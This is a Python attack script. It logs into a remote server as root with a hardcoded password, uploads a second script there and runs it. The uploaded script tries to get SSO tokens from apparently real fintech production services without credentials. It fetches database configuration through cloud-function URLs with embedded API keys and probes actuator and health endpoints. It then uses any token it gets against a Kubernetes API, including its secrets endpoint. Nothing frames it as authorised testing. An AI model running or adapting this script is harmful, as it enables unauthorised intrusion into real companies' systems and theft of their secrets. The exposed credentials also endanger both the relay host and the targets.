import paramiko, sys

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('64.177.88.10', username='root', password='5F.jyTK$D6%.F{a=', timeout=10)
print('Connected', flush=True)

SCRIPT = r'''
import requests, urllib3, json, sys, base64
urllib3.disable_warnings()
UA = "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"

s = requests.Session()
s.verify = False
s.headers.update({"User-Agent": UA, "Content-Type": "application/json"})

# ========================================
# 1. SSO TOKEN MINT (no creds needed!)
# ========================================
sys.stdout.write("="*60 + "\n=== TYSON SSO TOKEN MINT ===\n" + "="*60 + "\n\n")

sso_urls = [
    "https://sso-jwt-token-service2.tysonprod.com/v1/sso_findep/get_new_token",
    "https://sso-jwt-token-service.tysonprod.com/v1/sso_findep/get_new_token",
    "https://bff-sso-apps-service.tysonprod.com/v1/api/auth/app/token",
]

payloads = [
    {"appJwt": "TYSON-COBRANZA-GESTIONA", "serviceName": "multimedia-findep-service"},
    {"appJwt": "TYSON-COBRANZA-GESTIONA", "serviceName": "catalogs-service"},
    {"appJwt": "TYSON-COBRANZA-GESTIONA", "serviceName": "orchestrator-gestiona-service-v2"},
    {"appJwt": "TYSON-COBRANZA", "serviceName": "multimedia-findep-service"},
    {"appJwt": "FINDEP-MOBILE", "serviceName": "multimedia-findep-service"},
    {"appJwt": "FINDEP-HAWKING", "serviceName": "catalogs-service"},
    {"appJwt": "FINDEP-HAWKING", "serviceName": "orchestrator-service"},
    {"appJwt": "COBRANZA-GESTIONA", "serviceName": "multimedia-findep-service"},
]

token = None
for url in sso_urls:
    for payload in payloads:
        try:
            r = s.post(url, json=payload, timeout=10)
            sys.stdout.write(f"  POST {url.split('//')[1][:60]}\n")
            sys.stdout.write(f"    Payload: {json.dumps(payload)}\n")
            sys.stdout.write(f"    [{r.status_code}] {r.text[:500]}\n")
            if r.status_code == 200 and len(r.text) > 20:
                try:
                    data = r.json()
                    for k, v in data.items():
                        if isinstance(v, str) and len(v) > 50 and "." in v:
                            token = v
                            sys.stdout.write(f"\n    *** TOKEN OBTAINED ({k}) ***\n")
                            sys.stdout.write(f"    First 200: {token[:200]}\n")
                            parts = token.split(".")
                            if len(parts) == 3:
                                pad = lambda ss: ss + "=" * (-len(ss) % 4)
                                try:
                                    header = json.loads(base64.urlsafe_b64decode(pad(parts[0])))
                                    payload_dec = json.loads(base64.urlsafe_b64decode(pad(parts[1])))
                                    sys.stdout.write(f"    JWT Header: {json.dumps(header)}\n")
                                    sys.stdout.write(f"    JWT Payload: {json.dumps(payload_dec)}\n")
                                except:
                                    pass
                            break
                except:
                    pass
            sys.stdout.flush()
        except Exception as e:
            sys.stdout.write(f"  ERR {url[:40]}: {e}\n")
        sys.stdout.flush()
    sys.stdout.write("\n")

# ========================================
# 2. CLOUD FUNCTIONS CONFIG PROXY
# ========================================
sys.stdout.write("="*60 + "\n=== CLOUD FUNCTIONS CONFIG PROXY ===\n" + "="*60 + "\n\n")

cf_urls = [
    ("prod", "https://us-central1-fintech-produccion-mx.cloudfunctions.net/dbConfigProxy?key=Sk3ZrzpqfJ3uhUNTuU9W5kESe"),
    ("qa", "https://us-central1-pruebas-fisa.cloudfunctions.net/dbConfigProxy?key=KSRoRJyGlRtPH5zv8xtbB7UTj"),
    ("prod-nokey", "https://us-central1-fintech-produccion-mx.cloudfunctions.net/dbConfigProxy"),
    ("qa-nokey", "https://us-central1-pruebas-fisa.cloudfunctions.net/dbConfigProxy"),
]

for env, url in cf_urls:
    try:
        r = s.get(url, timeout=10)
        sys.stdout.write(f"  [{env}] [{r.status_code}] {len(r.text)}b\n")
        sys.stdout.write(f"    Body: {r.text[:1500]}\n")
        if r.status_code == 200 and len(r.text) > 10:
            with open(f"/root/cf_config_{env}.json", "w") as f:
                f.write(r.text)
            sys.stdout.write(f"    SAVED to /root/cf_config_{env}.json\n")
    except Exception as e:
        sys.stdout.write(f"  [{env}] ERR: {e}\n")
    sys.stdout.flush()

# ========================================
# 3. ADDITIONAL TYSON SERVICES
# ========================================
sys.stdout.write("\n" + "="*60 + "\n=== TYSON SERVICES PROBE ===\n" + "="*60 + "\n\n")

tyson_eps = [
    ("sso-jwt-token-service2", "https://sso-jwt-token-service2.tysonprod.com/"),
    ("sso-jwt-token-service2 health", "https://sso-jwt-token-service2.tysonprod.com/health"),
    ("sso-jwt-token-service2 actuator", "https://sso-jwt-token-service2.tysonprod.com/actuator"),
    ("sso-jwt-token-service2 actuator/env", "https://sso-jwt-token-service2.tysonprod.com/actuator/env"),
    ("bff-sso-apps", "https://bff-sso-apps-service.tysonprod.com/"),
    ("bff-sso-apps health", "https://bff-sso-apps-service.tysonprod.com/health"),
    ("bff-sso-apps actuator", "https://bff-sso-apps-service.tysonprod.com/actuator"),
    ("dynamicjourney-orch", "https://dynamicjourney-orchestrator.tysonprod.com/"),
    ("dynamicjourney health", "https://dynamicjourney-orchestrator.tysonprod.com/health"),
    ("dynamicjourney actuator", "https://dynamicjourney-orchestrator.tysonprod.com/actuator"),
    ("dynamicjourney actuator/env", "https://dynamicjourney-orchestrator.tysonprod.com/actuator/env"),
    ("multimedia-findep", "https://multimedia-findep-service.tysonprod.com/"),
    ("multimedia health", "https://multimedia-findep-service.tysonprod.com/health"),
    ("multimedia actuator", "https://multimedia-findep-service.tysonprod.com/actuator"),
    ("catalogs-service", "https://catalogs-service.tysonprod.com/"),
    ("catalogs health", "https://catalogs-service.tysonprod.com/health"),
    ("catalogs actuator", "https://catalogs-service.tysonprod.com/actuator"),
    ("orchestrator-gestiona-v2", "https://orchestrator-gestiona-service-v2.tysonprod.com/"),
    ("orchestrator health", "https://orchestrator-gestiona-service-v2.tysonprod.com/health"),
    ("orchestrator actuator", "https://orchestrator-gestiona-service-v2.tysonprod.com/actuator"),
]

for label, url in tyson_eps:
    try:
        r = s.get(url, timeout=8, allow_redirects=False)
        tag = ""
        if r.status_code == 200 and len(r.text) > 50:
            tag = " *** HIT ***"
        if r.status_code != 404 or tag:
            sys.stdout.write(f"  [{r.status_code}] {label} ({len(r.text)}b){tag}\n")
            if tag or (r.status_code == 200 and len(r.text) > 20):
                sys.stdout.write(f"    {r.text[:600]}\n")
    except Exception as e:
        sys.stdout.write(f"  ERR {label}: {str(e)[:60]}\n")
    sys.stdout.flush()

# ========================================
# 4. IF TOKEN, TRY K8s + calidad-architect
# ========================================
if token:
    sys.stdout.write("\n" + "="*60 + "\n=== TOKEN vs K8s + SERVICES ===\n" + "="*60 + "\n\n")
    K8S = "35.238.21.37"
    for path in ["/version", "/api", "/apis", "/api/v1/namespaces", "/api/v1/secrets"]:
        try:
            r = requests.get(f"https://{K8S}{path}",
                headers={"Host": "bff-origination-service.orquesta.calidad-architect.com",
                         "Authorization": f"Bearer {token}", "User-Agent": UA},
                timeout=5, verify=False)
            sys.stdout.write(f"  [{r.status_code}] {path} {r.text[:300]}\n")
        except Exception as e:
            sys.stdout.write(f"  ERR {path}: {e}\n")
        sys.stdout.flush()

    sys.stdout.write("\n=== TOKEN vs calidad-architect ===\n")
    for host in [
        "catalogs-service.core.calidad-architect.com",
        "bff-origination-service.orquesta.calidad-architect.com",
        "eureka.calidad-architect.com",
    ]:
        for path in ["/", "/actuator/health", "/actuator/env"]:
            try:
                r = requests.get(f"https://{K8S}{path}",
                    headers={"Host": host, "Authorization": f"Bearer {token}", "User-Agent": UA},
                    timeout=5, verify=False)
                if r.status_code != 401:
                    sys.stdout.write(f"  [{r.status_code}] {host}{path} ({len(r.text)}b)\n")
                    sys.stdout.write(f"    {r.text[:400]}\n")
            except:
                pass
            sys.stdout.flush()

sys.stdout.write("\n=== ALL DONE ===\n")
sys.stdout.flush()
'''

sftp = ssh.open_sftp()
with sftp.open('/root/tyson_sso.py', 'w') as f:
    f.write(SCRIPT)
sftp.close()
print('Uploaded', flush=True)

stdin, stdout, stderr = ssh.exec_command('python3 -u /root/tyson_sso.py 2>&1', timeout=300)
out = stdout.read().decode(errors='replace')
print(out, flush=True)
ssh.close()
print('Fin.', flush=True)
